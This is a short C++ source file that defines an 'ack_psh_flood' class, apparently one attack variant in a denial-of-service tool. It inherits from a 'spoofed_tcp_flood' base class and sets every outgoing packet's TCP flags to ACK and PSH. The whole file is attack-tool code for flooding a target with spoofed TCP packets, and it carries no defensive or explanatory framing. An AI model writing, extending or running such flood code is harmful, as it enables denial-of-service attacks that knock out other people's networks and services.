#include "ack_psh_flood.h"

ack_psh_flood::ack_psh_flood() : spoofed_tcp_flood() {}

void ack_psh_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_ACK | TH_PUSH;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}
